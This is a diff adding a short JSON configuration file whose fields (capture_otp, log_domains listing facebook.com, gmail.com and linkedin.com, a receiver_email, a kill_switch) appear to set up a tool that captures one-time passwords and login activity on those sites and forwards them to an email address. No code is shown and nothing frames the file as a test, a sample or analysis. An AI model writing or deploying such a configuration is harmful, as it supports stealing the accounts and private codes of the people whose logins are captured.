@@ -1,0 +1,11 @@
+{
+  "enabled": true,
+  "kill_switch": false,
+  "receiver_email": "example@example.com",
+  "capture_otp": true,
+  "log_domains": [
+    "facebook.com",
+    "gmail.com",
+    "linkedin.com"
+  ]
+}
